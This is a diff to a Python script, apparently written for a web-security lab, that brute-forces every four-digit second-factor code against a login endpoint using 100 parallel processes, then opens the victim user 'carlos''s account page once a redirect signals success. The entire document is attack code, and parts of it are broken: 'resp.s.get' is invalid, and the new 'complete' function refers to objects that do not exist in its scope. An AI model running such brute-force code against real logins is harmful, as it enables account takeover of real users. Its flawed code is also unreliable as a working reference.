@@ -46,6 +46,13 @@ def login_user(s):
     # print(f'Login response: {resp.text}')
 
     return csrf
+def complete(auth_code):
+    pool.close()
+    event.wait()
+    p.terminate()
+    print("=============================")
+    print(f'== Auth Code:  {auth_code} ==')
+    print("=============================")
 
 def auth_check(auth_code, event):
     if not event.is_set():
@@ -61,25 +68,26 @@ def auth_check(auth_code, event):
 
         resp = s.post(login2_url, data=login2data, allow_redirects=False)
         if resp.status_code == 302:
-            print(f'== {auth_code} || {resp.status_code} ==')
-        
+            print(f'== Auth Code: {auth_code} || {resp.status_code} ==  <-- Correct')
             resp.s.get(f'https://{site}/my-account?id=carlos')
-            
+            complete(auth_code)
             event.set()
         
         if resp.status_code == 200:
-            print(f'== {auth_code} || false ==')
+            print(f'== Auth Code: {auth_code} || {resp.status_code} ==')
             pass
         else:
-            print(f'== {auth_code} || {resp.status_code} ==')
+            print(f'== Auth Code: {auth_code} || {resp.status_code} ==')
             event.set()
 
 
+#https://www.analyticsvidhya.com/blog/2021/04/a-beginners-guide-to-multi-processing-in-python/
 
 @time_decorator
 def run_test():
-    multiplier = 3
-    pool = multiprocessing.Pool(multiprocessing.cpu_count()*multiplier)
+    multiplier = 4
+    cpu_count = multiprocessing.cpu_count()
+    pool = multiprocessing.Pool(100)
 
     procManager = multiprocessing.Manager()
     event = procManager.Event()
@@ -89,7 +97,7 @@ def run_test():
         auth_code.append('%04d' % i)
 
     for i in range(10000):
-        pool.apply_async(auth_check (auth_code[i], event))
+        pool.apply_async(auth_check, (auth_code[i], event))
     pool.close()
 
     event.wait()
